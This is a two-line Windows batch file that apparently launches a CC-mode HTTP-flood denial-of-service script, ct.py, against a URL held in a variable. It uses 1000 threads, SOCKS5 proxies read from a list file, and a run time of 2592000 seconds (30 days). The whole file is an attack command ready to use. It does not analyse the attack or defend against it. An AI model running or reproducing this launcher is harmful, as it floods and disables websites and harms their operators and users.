@echo off
python ct.py -url %SETURL% -m cc -v 5 -t 1000 -f %PROXY%socks5.txt -b 1 -s 2592000 %VERIFY%
